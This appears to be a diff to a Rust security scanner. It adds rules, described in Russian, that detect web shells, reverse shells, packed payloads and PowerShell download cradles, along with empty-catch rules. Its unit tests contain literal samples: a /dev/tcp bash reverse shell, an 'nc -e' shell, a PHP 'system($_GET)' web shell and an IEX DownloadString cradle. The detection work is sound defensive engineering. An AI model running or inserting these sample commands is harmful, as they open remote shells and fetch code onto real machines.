@@ -2479,6 +2479,241 @@ pub static RULES: &[Rule] = &[
         skip_in_tests: true,
     },
 
+    // ------------------------------------------ Индикаторы компрометации
+    // These are not "risky patterns" — they are what an attacker plants. A live
+    // web shell or a reverse shell in the tree means the box is already owned, so
+    // they are Critical with high confidence: legitimate code essentially never
+    // does this, and a false negative here is far worse than a rare false alarm.
+    Rule {
+        id: "VS-PH-011",
+        title: "Веб-шелл: выполнение данных запроса",
+        description: "eval/system/exec/shell_exec поверх $_GET/$_POST/$_REQUEST — это команда «выполни то, что я пришлю». Классический веб-шелл: сервер уже под контролем атакующего.",
+        recommendation: "Удалите файл и считайте сервер скомпрометированным: смените пароли и ключи, проверьте логи и остальные файлы на закладки.",
+        severity: Severity::Critical,
+        confidence: Confidence::High,
+        category: "Индикатор компрометации",
+        languages: &[Language::Php],
+        pattern: r#"(?i)\b(?:eval|assert|system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec)\s*\(\s*(?:stripslashes\s*\(\s*)?\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\b"#,
+        unless_contains: &[],
+        cwe: &["CWE-94", "CWE-78"],
+        owasp: Some(OWASP_INJECTION),
+        references: &["https://owasp.org/www-community/attacks/Web_Shell"],
+        skip_in_tests: false,
+    },
+    Rule {
+        id: "VS-PH-012",
+        title: "Веб-шелл: вызов функции по имени из запроса",
+        description: "$_GET['x']($_GET['y']) вызывает любую функцию PHP с любыми аргументами из запроса. Это диспетчер веб-шелла, замаскированный под безобидную индексацию массива.",
+        recommendation: "Удалите файл и считайте сервер скомпрометированным. Динамический вызов функции из ввода недопустим.",
+        severity: Severity::Critical,
+        confidence: Confidence::High,
+        category: "Индикатор компрометации",
+        languages: &[Language::Php],
+        pattern: r#"\$_(?:GET|POST|REQUEST|COOKIE)\s*\[[^\]]+\]\s*\("#,
+        unless_contains: &[],
+        cwe: &["CWE-94"],
+        owasp: Some(OWASP_INJECTION),
+        references: &["https://owasp.org/www-community/attacks/Web_Shell"],
+        skip_in_tests: false,
+    },
+    Rule {
+        id: "VS-PH-013",
+        title: "Обфусцированный eval (упакованный веб-шелл)",
+        description: "eval поверх base64_decode/gzinflate/str_rot13 распаковывает и исполняет спрятанный код. Так пакуют веб-шеллы, чтобы пройти мимо беглого взгляда и простых сигнатур.",
+        recommendation: "Удалите файл и считайте сервер скомпрометированным. Легитимный код не прячет исполняемое за слоями декодирования.",
+        severity: Severity::Critical,
+        confidence: Confidence::High,
+        category: "Индикатор компрометации",
+        languages: &[Language::Php],
+        pattern: r#"(?i)\b(?:eval|assert)\s*\(\s*(?:gzinflate|gzuncompress|gzdecode|str_rot13|base64_decode|convert_uudecode|hex2bin|rawurldecode)\s*\("#,
+        unless_contains: &[],
+        cwe: &["CWE-94"],
+        owasp: Some(OWASP_INJECTION),
+        references: &["https://owasp.org/www-community/attacks/Web_Shell"],
+        skip_in_tests: false,
+    },
+    Rule {
+        id: "VS-SH-003",
+        title: "Реверс-шелл через /dev/tcp",
+        description: "Перенаправление в /dev/tcp/host/port открывает bash обратное соединение на машину атакующего. Это канонический однострочный реверс-шелл.",
+        recommendation: "Немедленно разберитесь, откуда это в коде: реверс-шелл в репозитории — признак взлома или злонамеренной вставки.",
+        severity: Severity::Critical,
+        confidence: Confidence::High,
+        category: "Индикатор компрометации",
+        languages: &[Language::Shell],
+        pattern: r#"/dev/(?:tcp|udp)/"#,
+        unless_contains: &[],
+        cwe: &["CWE-506"],
+        owasp: Some(OWASP_INJECTION),
+        references: &["https://cwe.mitre.org/data/definitions/506.html"],
+        skip_in_tests: false,
+    },
+    Rule {
+        id: "VS-SH-004",
+        title: "Реверс-шелл через netcat / mkfifo",
+        description: "netcat с -e или backpipe через mkfifo отдаёт интерактивную оболочку по сети. Ещё один стандартный реверс-шелл из шпаргалок пентестера.",
+        recommendation: "Разберитесь, откуда это: намеренный бэкдор или чужая вставка. В обычном коде такого быть не должно.",
+        severity: Severity::Critical,
+        confidence: Confidence::High,
+        category: "Индикатор компрометации",
+        languages: &[Language::Shell],
+        pattern: r#"(?i)\bn(?:c|cat)\b[^\n]*\s-[a-z]*e\b|mkfifo\b[^\n|]*\|[^\n]*\b(?:nc|ncat|/bin/(?:ba)?sh)\b"#,
+        unless_contains: &[],
+        cwe: &["CWE-506"],
+        owasp: Some(OWASP_INJECTION),
+        references: &["https://cwe.mitre.org/data/definitions/506.html"],
+        skip_in_tests: false,
+    },
+    Rule {
+        id: "VS-PY-027",
+        title: "Реверс-шелл на Python (pty/dup2 на сокет)",
+        description: "pty.spawn после подключения сокета или os.dup2 файлового дескриптора сокета на stdin/stdout — это интерактивный реверс-шелл на Python.",
+        recommendation: "Разберитесь, откуда это в коде: реверс-шелл — признак взлома или злонамеренной вставки.",
+        severity: Severity::Critical,
+        confidence: Confidence::High,
+        category: "Индикатор компрометации",
+        languages: PY,
+        pattern: r#"\bpty\.spawn\s*\(|\bos\.dup2\s*\(\s*\w+\.fileno\s*\(\s*\)\s*,\s*[012]\s*\)"#,
+        unless_contains: &[],
+        cwe: &["CWE-506"],
+        owasp: Some(OWASP_INJECTION),
+        references: &["https://cwe.mitre.org/data/definitions/506.html"],
+        skip_in_tests: false,
+    },
+    Rule {
+        id: "VS-PY-028",
+        title: "Исполнение декодированного кода (упакованный пейлоад)",
+        description: "exec/eval поверх base64.b64decode, bytes.fromhex, zlib.decompress или __import__ распаковывает и запускает спрятанный код — приём упаковки вредоносной нагрузки.",
+        recommendation: "Проверьте, что именно исполняется: легитимный код не прячет логику за слоями декодирования. При сомнении считайте файл вредоносным.",
+        severity: Severity::Critical,
+        confidence: Confidence::High,
+        category: "Индикатор компрометации",
+        languages: PY,
+        pattern: r#"(?i)\b(?:exec|eval)\s*\(\s*(?:base64\.b64decode|base64\.b32decode|codecs\.decode|bytes\.fromhex|zlib\.decompress|marshal\.loads|__import__)\s*\("#,
+        unless_contains: &[],
+        cwe: &["CWE-94", "CWE-506"],
+        owasp: Some(OWASP_INJECTION),
+        references: &["https://cwe.mitre.org/data/definitions/94.html"],
+        skip_in_tests: false,
+    },
+    Rule {
+        id: "VS-JS-030",
+        title: "Исполнение декодированного кода (упакованный пейлоад)",
+        description: "eval(atob(...)) или Function(atob(...)) распаковывает base64 и тут же исполняет — приём упаковки вредоносного JS, чтобы спрятать его от беглого просмотра.",
+        recommendation: "Проверьте, что именно исполняется. eval над декодированной строкой в проде почти всегда либо обфускация, либо закладка.",
+        severity: Severity::Critical,
+        confidence: Confidence::High,
+        category: "Индикатор компрометации",
+        languages: JS_FAMILY,
+        pattern: r#"(?i)\b(?:eval|Function)\s*\(\s*(?:atob|unescape|decodeURIComponent|Buffer\.from)\s*\("#,
+        unless_contains: &[],
+        cwe: &["CWE-94", "CWE-506"],
+        owasp: Some(OWASP_INJECTION),
+        references: &["https://cwe.mitre.org/data/definitions/94.html"],
+        skip_in_tests: false,
+    },
+    Rule {
+        id: "VS-PS-003",
+        title: "PowerShell download-cradle (скачать и выполнить)",
+        description: "IEX/Invoke-Expression поверх DownloadString/Invoke-WebRequest скачивает код с сети и сразу исполняет его в памяти. Это стандартный первый этап заражения на Windows.",
+        recommendation: "Разберитесь, откуда это в коде. Скачивание и выполнение кода из сети в памяти — признак вредоносной активности.",
+        severity: Severity::Critical,
+        confidence: Confidence::High,
+        category: "Индикатор компрометации",
+        languages: &[Language::PowerShell],
+        pattern: r#"(?i)(?:IEX|Invoke-Expression)\b[^\n]*(?:DownloadString|DownloadData|Net\.WebClient|Invoke-WebRequest|\biwr\b|\bwget\b|\bcurl\b)"#,
+        unless_contains: &[],
+        cwe: &["CWE-94", "CWE-506"],
+        owasp: Some(OWASP_INJECTION),
+        references: &["https://cwe.mitre.org/data/definitions/94.html"],
+        skip_in_tests: false,
+    },
+    Rule {
+        id: "VS-PS-004",
+        title: "PowerShell: скрытый закодированный запуск",
+        description: "-EncodedCommand с base64 (часто вместе с -WindowStyle Hidden / -NoProfile) прячет исполняемую команду от глаз и логов. Типичная упаковка вредоносного запуска.",
+        recommendation: "Раскодируйте и проверьте команду. Скрытый закодированный запуск в коде — сильный признак вредоносной вставки.",
+        severity: Severity::Critical,
+        confidence: Confidence::Medium,
+        category: "Индикатор компрометации",
+        languages: &[Language::PowerShell],
+        pattern: r#"(?i)-e(?:nc|ncodedcommand)?\s+["']?[A-Za-z0-9+/]{40,}={0,2}|-w(?:indowstyle)?\s+hidden\b[^\n]*-e"#,
+        unless_contains: &[],
+        cwe: &["CWE-506"],
+        owasp: Some(OWASP_INJECTION),
+        references: &["https://cwe.mitre.org/data/definitions/506.html"],
+        skip_in_tests: false,
+    },
+
+    // ---------------------------------------------- Проглоченные ошибки
+    // Not a vulnerability on their own, but a security check that raises and is
+    // silently swallowed fails open — the code proceeds as if nothing went wrong.
+    // Low severity; the value is making the silence visible.
+    Rule {
+        id: "VS-PY-029",
+        title: "Пустой except: исключение проглатывается",
+        description: "except с одним pass гасит любую ошибку без следа. Если так подавлена проверка прав или валидация, сбой пройдёт незаметно, и код продолжит работу как ни в чём не бывало.",
+        recommendation: "Ловите конкретный тип исключения и хотя бы логируйте его. Пустой except почти всегда прячет проблему, а не решает её.",
+        severity: Severity::Low,
+        confidence: Confidence::Medium,
+        category: "Обработка ошибок",
+        languages: PY,
+        pattern: r#"(?m)^\s*except\b[^:\n]*:\s*pass\b"#,
+        unless_contains: &[],
+        cwe: &["CWE-703"],
+        owasp: Some(OWASP_DESIGN),
+        references: &["https://cwe.mitre.org/data/definitions/703.html"],
+        skip_in_tests: true,
+    },
+    Rule {
+        id: "VS-JS-031",
+        title: "Пустой catch: ошибка проглатывается",
+        description: "Пустой блок catch гасит исключение без следа. Упавшая проверка или сетевой сбой пройдут незаметно, и выполнение продолжится с неполными данными.",
+        recommendation: "Обработайте ошибку или хотя бы залогируйте её. Пустой catch превращает сбой в тихий баг.",
+        severity: Severity::Low,
+        confidence: Confidence::Medium,
+        category: "Обработка ошибок",
+        languages: JS_FAMILY,
+        pattern: r#"catch\s*(?:\([^)]*\))?\s*\{\s*\}"#,
+        unless_contains: &[],
+        cwe: &["CWE-703"],
+        owasp: Some(OWASP_DESIGN),
+        references: &["https://cwe.mitre.org/data/definitions/703.html"],
+        skip_in_tests: true,
+    },
+    Rule {
+        id: "VS-JV-013",
+        title: "Пустой catch: исключение проглатывается",
+        description: "Пустой блок catch гасит исключение молча. Сбой проверки или операции пройдёт незамеченным, а код продолжит работу с неопределённым состоянием.",
+        recommendation: "Обработайте или прокиньте исключение и залогируйте его. Пустой catch скрывает проблему вместо её решения.",
+        severity: Severity::Low,
+        confidence: Confidence::Medium,
+        category: "Обработка ошибок",
+        languages: &[Language::Java, Language::Kotlin],
+        pattern: r#"catch\s*\([^)]*\)\s*\{\s*\}"#,
+        unless_contains: &[],
+        cwe: &["CWE-703"],
+        owasp: Some(OWASP_DESIGN),
+        references: &["https://cwe.mitre.org/data/definitions/703.html"],
+        skip_in_tests: true,
+    },
+    Rule {
+        id: "VS-CS-009",
+        title: "Пустой catch: исключение проглатывается",
+        description: "Пустой блок catch гасит исключение молча. Сбой проверки или операции пройдёт незамеченным, а код продолжит работу с неопределённым состоянием.",
+        recommendation: "Обработайте или прокиньте исключение и залогируйте его. Пустой catch скрывает проблему вместо её решения.",
+        severity: Severity::Low,
+        confidence: Confidence::Medium,
+        category: "Обработка ошибок",
+        languages: &[Language::CSharp],
+        pattern: r#"catch\s*(?:\([^)]*\))?\s*\{\s*\}"#,
+        unless_contains: &[],
+        cwe: &["CWE-703"],
+        owasp: Some(OWASP_DESIGN),
+        references: &["https://cwe.mitre.org/data/definitions/703.html"],
+        skip_in_tests: true,
+    },
+
     // ------------------------------------------------------------------- SQL
     Rule {
         id: "VS-SQL-001",
@@ -3299,6 +3534,47 @@ mod tests {
     fn finds_java_dom4j_xxe() {
         let code = "SAXReader reader = new SAXReader();\n";
         assert!(hit_ids(code, Language::Java, "Xml.java").contains(&"VS-JV-011"));
+    }
+
+    #[test]
+    fn finds_php_webshell() {
+        assert!(hit_ids("<?php system($_GET['cmd']);", Language::Php, "up.php").contains(&"VS-PH-011"));
+        assert!(hit_ids("<?php $_POST['f']($_POST['a']);", Language::Php, "x.php").contains(&"VS-PH-012"));
+        assert!(hit_ids("<?php eval(base64_decode($p));", Language::Php, "x.php").contains(&"VS-PH-013"));
+    }
+
+    #[test]
+    fn php_normal_superglobal_use_is_not_a_webshell() {
+        // Reading a request value is everyday code; only executing it is the shell.
+        let ok = "<?php $name = htmlspecialchars($_GET['name']);\necho $name;\n";
+        let ids = hit_ids(ok, Language::Php, "page.php");
+        assert!(!ids.contains(&"VS-PH-011"));
+        assert!(!ids.contains(&"VS-PH-012"));
+    }
+
+    #[test]
+    fn finds_reverse_shells() {
+        assert!(hit_ids("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n", Language::Shell, "x.sh").contains(&"VS-SH-003"));
+        assert!(hit_ids("nc -e /bin/sh 10.0.0.1 4444\n", Language::Shell, "x.sh").contains(&"VS-SH-004"));
+        let py = "import pty; pty.spawn(\"/bin/bash\")\n";
+        assert!(hit_ids(py, Language::Python, "s.py").contains(&"VS-PY-027"));
+    }
+
+    #[test]
+    fn finds_packed_payloads() {
+        assert!(hit_ids("exec(base64.b64decode(blob))\n", Language::Python, "x.py").contains(&"VS-PY-028"));
+        assert!(hit_ids("eval(atob('ZG9jdW1lbnQ='))\n", Language::JavaScript, "x.js").contains(&"VS-JS-030"));
+        let ps = "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\n";
+        assert!(hit_ids(ps, Language::PowerShell, "x.ps1").contains(&"VS-PS-003"));
+    }
+
+    #[test]
+    fn finds_swallowed_exceptions() {
+        assert!(hit_ids("try:\n    f()\nexcept Exception:\n    pass\n", Language::Python, "a.py").contains(&"VS-PY-029"));
+        assert!(hit_ids("try { f(); } catch (e) {}\n", Language::JavaScript, "a.js").contains(&"VS-JS-031"));
+        // A catch that actually does something is fine.
+        let ok = "try:\n    f()\nexcept ValueError:\n    log(e)\n";
+        assert!(!hit_ids(ok, Language::Python, "a.py").contains(&"VS-PY-029"));
     }
 
     #[test]
